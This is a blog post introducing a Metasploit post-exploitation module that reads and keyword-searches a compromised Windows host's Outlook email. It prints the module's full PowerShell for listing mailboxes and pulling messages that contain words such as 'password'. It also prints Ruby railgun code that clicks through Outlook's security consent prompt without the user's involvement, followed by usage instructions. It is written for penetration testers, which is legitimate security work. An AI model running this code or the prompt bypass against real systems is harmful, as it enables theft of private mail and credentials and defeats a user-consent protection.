---
id: 201
title: Reading Outlook using Metasploit
date: 2014-12-08T21:47:15+01:00
author: wesley
layout: post
permalink: /2014/12/reading-outlook-using-metasploit/
---
In penetration tests, it sometimes can be hard to escalate privileges on a (Windows<img style="float: right;" src="https://forsec.nl/wp-content/uploads/2014/12/Outlook.jpg" alt="Outlook" width="151" height="148" />) target system. In this situation it can be useful to gain access to resources with sensitive information, such as passwords.

Metasploit does not have any module to read email messages from a local Outlook installation. Outlook can however contain a lot of sensitive and useful information in a penetration test, such as networkcredentials. I decided to create a Metasploit module which can read and/or search the local Outlook email messages.

**How?**

In order to do this, the module is using powershell. The following powershell script is used by the Metasploit module:

<!--more-->

{% highlight powershell %}
function GetSubfolders($root) {
  $folders = @()
  $folders += $root
  foreach ($folder in $root.Folders) {
    $folders += GetSubfolders($folder)
  }
  return $folders
}

function List-Folder {
  Clear-host
  Add-Type -Assembly "Microsoft.Office.Interop.Outlook"
  $Outlook = New-Object -ComObject Outlook.Application
  $Namespace = $Outlook.GetNameSpace("MAPI")
  $account = $NameSpace.Folders
  $folders = @()
  foreach ($acc in $account) {
    foreach ($folder in $acc.Folders) {
      $folders += GetSubfolders($folder)
    }
  }
  $folders | FT FolderPath
}

function Get-Emails {
  param ([String]$searchTerm,[String]$Folder)
  Add-Type -Assembly "Microsoft.Office.Interop.Outlook"
  $Outlook = New-Object -ComObject Outlook.Application
  $Namespace = $Outlook.GetNameSpace("MAPI")
  $account = $NameSpace.Folders
  $found = $false
  foreach ($acc in $account) {
    try {
      $Email = $acc.Folders.Item($Folder).Items
      $result = $Email | Where-Object {$_.HTMLBody -like '*' + $searchTerm + '*' -or $_.TaskSubject -like '*' + $searchTerm + '*'}
      if($result) {
        $found = $true
        $result | Format-List To, SenderEmailAddress, CreationTime, TaskSubject, HTMLBody
      }
    } catch {
      Write-Host "Folder" $Folder "not found in mailbox" $acc.Name
    }
  }
  if(-Not $found) {
    Write-Host "Searchterm" $searchTerm "not found"
  }
}
{% endhighlight %}

The function &#8216;List-Folder&#8217; displays all the available mailboxes and associated folders in a local Outlook installation. The function &#8216;Get-Emails&#8217; is used to display messages in a specified folder, these messages can also be filtered by a keyword (for example &#8216;password&#8217;).

A problem which i stumbled on was a security popup when connecting to Outlook using powershell. The popup looks like this:

[<img class="alignnone  wp-image-202" src="https://forsec.nl/wp-content/uploads/2014/11/microsoft_outlook_security_popup.png" alt="microsoft_outlook_security_popup" width="430" height="239" />](https://forsec.nl/wp-content/uploads/2014/11/microsoft_outlook_security_popup.png)

It was quite a challenge to bypass this message, because it has to be clicked by the user manually. In the module i used WinAPI in order to accomplish the bypass. Please note, that a user behind the target system, can notice these activities. So keep in mind that they might be able to detect your activities when using this module. The following function is checking the &#8220;allow access for&#8221; box and clicking the &#8220;allow&#8221; button.

{% highlight powershell %}
def clickButton(atrans,acftrans)
    # This functions clicks on the security notification generated by Outlook.
    sleep 1
    hwnd = client.railgun.user32.FindWindowW(nil, "Microsoft Outlook")
    if hwnd != 0
      hwndChildCk = client.railgun.user32.FindWindowExW(hwnd['return'], nil, "Button", "&#{acftrans}")
      client.railgun.user32.SendMessageW(hwndChildCk['return'], 0x00F1, 1, nil)
      client.railgun.user32.MoveWindow(hwnd['return'],150,150,1,1,true)
      hwndChild = client.railgun.user32.FindWindowExW(hwnd['return'], nil, "Button", "#{atrans}")
      client.railgun.user32.SetActiveWindow(hwndChild['return'])
      client.railgun.user32.SetForegroundWindow(hwndChild['return'])
      client.railgun.user32.SetCursorPos(150,150)
      client.railgun.user32.mouse_event(0x0002,150,150,nil,nil)
      client.railgun.user32.SendMessageW(hwndChild['return'], 0x00F5, 0, nil)
    else
      print_error("Error while clicking on the Outlook security notification. Window could not be found")
    end
  end
{% endhighlight %}

**Module usage**

The module can be installed by updating Metasploit. The module has two &#8216;ACTIONS&#8217;:

  * LIST: Display the available mailboxes and folders in a local Outlook installation
  * SEARCH: Display messages in a specified **FOLDER**, can be filtered by a **KEYWORD**

The LIST action requires only the options &#8216;SESSION&#8217; to be set.

<span style="line-height: 1.714285714; font-size: 1rem;">In order to use the SEARCH action, the module has several options which can be set. The following options are present in the module:</span>

<pre><em>ACF_TRANSLATION</em>: Fill in the translation of the phrase "Allow access for" in the targets system language, to click on the security popup.
<em>A_TRANSLATION</em>: Fill in the translation of the word "Allow" in the targets system language, to click on the security popup.
<em>FOLDER</em>:The e-mailfolder to read (e.g. Inbox)
<em>KEYWORD</em>: The keyword to search in the emails
<em>LIST_FOLDERS</em>: List folders available in the mailbox
<em>SESSION</em>: Session to run the MSF module on
</pre>

The options FOLDER (folder to search, e.g. &#8220;Inbox&#8221;) and KEYWORD (filter on a keyword like &#8220;password&#8221;) are pretty straightforward.

The options A\_TRANSLATION and ACF\_TRANSLATION are required to click on Outlooks security notification, when the language is not supported by the module (en-US, NL and DE are supported). Fill in the translation present on the target system of &#8220;Allow&#8221; into the option &#8220;A\_TRANSLATION&#8221; and &#8220;Allow access for&#8221; in &#8220;ACF\_TRANSLATION&#8221;.

The following output is a example snippet of output which is generated by the Metasploit module when using the &#8216;LIST&#8217; action:

[<img class="alignnone size-full wp-image-234" src="https://forsec.nl/wp-content/uploads/2014/12/LIST-action-msf.png" alt="LIST-action-msf" width="1051" height="1494" />](https://forsec.nl/wp-content/uploads/2014/12/LIST-action-msf.png)

The following output is a example snippet of output which is generated by the Metasploit module when using the &#8216;SEARCH&#8217; action, on the folder &#8216;Inbox&#8217; with a keyword &#8216;password&#8217;:

[<img class="alignnone size-full wp-image-235" src="https://forsec.nl/wp-content/uploads/2014/12/SEARCH-action-msf.png" alt="SEARCH-action-msf" width="1211" height="1360" />](https://forsec.nl/wp-content/uploads/2014/12/SEARCH-action-msf.png)

I&#8217;ve submitted the module to the official master github of Metasploit. The module has been merged, and the code can be found at:  
<a title="https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/outlook.rb" href="https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/outlook.rb" target="_blank">https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/outlook.rb</a>  
<a title="https://github.com/rapid7/metasploit-framework/blob/master/data/post/powershell/outlook.ps1" href="https://github.com/rapid7/metasploit-framework/blob/master/data/post/powershell/outlook.ps1" target="_blank">https://github.com/rapid7/metasploit-framework/blob/master/data/post/powershell/outlook.ps1</a>